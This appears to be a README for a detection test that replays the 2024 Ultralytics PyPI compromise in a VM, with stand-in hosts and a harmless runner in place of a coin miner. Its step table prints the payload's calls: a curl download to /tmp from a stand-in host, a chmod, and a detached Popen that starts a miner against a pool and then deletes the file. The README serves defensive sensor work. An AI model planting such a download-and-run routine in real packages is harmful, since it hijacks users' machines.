# Ultralytics compromise

The PyPI compromise of December 2024: four releases of `ultralytics`
(8.3.41 and 8.3.42, built by the project's own GitHub Actions workflow after
its build cache was poisoned through a pull request's branch name, then
8.3.45 and 8.3.46, uploaded with a PyPI token taken in the first round). The
first two carried a downloader in the model class's constructor: on Linux
and on an Apple-silicon Mac it fetched an XMRig coin miner into `/tmp`,
started it against a mining pool, and deleted the file.

The recording is of a developer's Mac (a VM) where the person makes a
virtualenv, types `pip install acme-vision` and makes a detector once in
Python, and of nothing else they do.

## What happens in the recording

| step | what the sensor sees | from the write-ups |
|---|---|---|
| 1 | `pip install` unpacks the wheel into the virtualenv's `site-packages`. Nothing runs yet | the payload was in the package's own modules, `models/yolo/model.py` and `utils/downloads.py`, not in an install hook (HiddenLayer, ReversingLabs, issue #18027) |
| 2 | the person's `python -c` makes a `Detector`, and that Python starts `curl -# -H "Accept: application/vnd.github.raw+json" -sSL https://api.acme-vision.example/repos/acme/acme-vision/git/blobs/<id> -o /tmp/acme_vision_runner --retry 3 -C -`: a connection to port 443, and the file written in `/tmp` | the constructor's branch for `Darwin` and `arm64` called `safe_download(<blob id>, progress=False, delete=True, file="/tmp/ultralytics_runner", gitApi=True)`, which had curl ask GitHub's API for one blob of the project's repository (HiddenLayer; the code as posted in ComfyUI-Impact-Pack #843) |
| 3 | the file's mode set to 770, by Python itself: no `chmod` is started | `os.chmod(path, 0o770)` in `safe_run` (HiddenLayer, #843) |
| 4 | Python starts `/tmp/acme_vision_runner -u <95 characters> -o pool.acme-vision.example:8080 -k`, in a session of its own, its input and output `/dev/null` | `subprocess.Popen([path, "-u", <wallet>, "-o", "<pool>:8080", "-k"], stdin=DEVNULL, stdout=DEVNULL, stderr=DEVNULL, preexec_fn=os.setsid, close_fds=True)` (HiddenLayer, #843) |
| 5 | Python deletes `/tmp/acme_vision_runner`, prints the detector's names and exits; the runner goes on, with no file behind it and launchd for a parent | `os.remove(path)` straight after the start (HiddenLayer, #843) |
| 6 | the runner holds one connection to `pool.acme-vision.example` port 8080 and keeps one core busy for 90 seconds, then exits | the miner's pool, on port 8080 (BleepingComputer, HiddenLayer, #843); XMRig processes at work (BleepingComputer's screenshot) |

`twin.sh` is the same kinds of acts by the person on their own work: a
virtualenv, `pip install scikit-learn` from the real PyPI, and a Python that
downloads a file at first use (the California housing data, about 440 kB
from scikit-learn's own data host, into `~/scikit_learn_data`) and then
keeps one core busy for a minute or so: a gradient-boosting model of 500
trees fitted five times over for a cross-validation score.

## What is real and what is stood in

Real: every program and its parent (`pip`, `python`, `curl`, the runner),
the `curl` command line but for the address in it, the file written in
`/tmp`, its mode, its arguments' shape, the session of its own, the deletion,
the connection to port 8080 that stays open.

Stood in:

- **PyPI.** `pypi.org` and `files.pythonhosted.org` in the VM are
  [`standin/registry.py`](../../standin/registry.py) on the host, so the
  connections carry PyPI's names and a private address. The infected wheel
  comes from it; every other project (the twin's scikit-learn and what it
  needs) is passed through from the real PyPI.
- **Where the binary came from.** The real download was from
  `api.github.com`: a blob of the project's own repository, which the
  attacker had put there. Here it is `api.acme-vision.example`, the same
  stand-in, with a path of the same shape. So the recording has a made-up
  host where the incident had a host every developer's Mac talks to.
- **The miner.** The real file was XMRig, a native binary. Here the stand-in
  answers `curl` with [`runner.py`](runner.py), a Python script
  (`#!/usr/bin/env python3`), so the process the sensor sees started from
  `/tmp/acme_vision_runner` becomes `env` and then `python3` with that path
  as its script. It is not a miner and has no mining code in it: it adds up
  squares on one core and throws the sums away. A real XMRig takes most of
  the machine's cores by default; one is what this takes.
- **The pool.** `pool.acme-vision.example` is the same stand-in, which
  answers plain HTTP on port 8080 and keeps nothing. A miner speaks the
  pool's own protocol (lines of JSON over one long TCP connection); the
  runner sends one HTTP POST whose body is six lines of 128 random bytes,
  one every fifteen seconds, so that the connection stays open as a miner's
  does. Nothing from the machine is in it.
- **The wallet.** The `-u` argument is 95 characters of filler in the shape
  of an address. It is no one's.
- **The delay before the deletion.** The real file was deleted on the line
  after it was started, which a running binary does not mind. A script's
  interpreter has still to open it, so `safe_run` waits two seconds first.
- **The names.** The package (`acme-vision`), its modules and class, the
  hosts, the blob's id and the file in `/tmp` are made up; the incident's
  own are not used, so that nothing is caught by a name. The two helpers
  keep the names of the real ones, `safe_download` and `safe_run`, which no
  sensor sees.

Filled with the plainest thing, where the write-ups give no detail: what
the package does when it is not infected (a class that knows five names and
finds nothing), and how long the miner ran (until someone stopped it; here
90 seconds).

Not in the recording:

- **The Linux branch**, first in the real constructor (another blob of the
  same repository, for x86).
- **The third and fourth releases.** 8.3.45's `__init__.py` ran on import
  and, on a Mac too, posted the output of `printenv` and `ls -la`,
  base64-encoded, to a webhook address; 8.3.46 dropped that and, on Linux
  only, fetched XMRig from its own GitHub release with `wget`, unpacked it
  with `tar` and started it with `nohup` against a second pool (HiddenLayer).
  The first is a different case (an environment sent out) and the second
  never ran on a Mac.
- **How the releases came to be**: the pull requests with shell in their
  branch names, the poisoned GitHub Actions cache, the PyPI token (Wiz,
  Woodruff, PyPI's own post). None of it happens on a developer's Mac.
- **A real miner's load**: every core, for hours. And nothing here says the
  macOS binary of the incident ran on a Mac at all: the write-ups have the
  branch's code, and reports from Linux, not from a Mac.

The payload runs only on a recording VM (`/etc/tangent-eval-vm`, and an
`api.acme-vision.example` or `pool.acme-vision.example` that resolves to a
private address): off one the package's addition is skipped and the runner
exits at once.

## Needs in the VM

Nothing installed. `record.sh` writes pip's machine-wide config before the
capture, so pip trusts the stand-in (see [`litellm`](../litellm)). Three
things to know:

- The VM must be Apple silicon (`platform.machine()` is `arm64`), as the
  real branch asked. A tart VM on an Apple-silicon host is.
- The runner is started with the virtualenv's `PATH`, so its `python3` is
  the virtualenv's. It needs Python 3.9 or later.
- The twin's scikit-learn, numpy and scipy come as wheels for the VM's
  `python3` (about 60 MB, through the stand-in from the real PyPI), and its
  Python must be able to verify `ndownloader.figshare.com`'s certificate,
  which Homebrew's and the command line tools' can. The minute is a guess
  from the size of the fit, not a measurement: nothing was run to write the
  case.

## Sources

See [`case.json`](case.json).
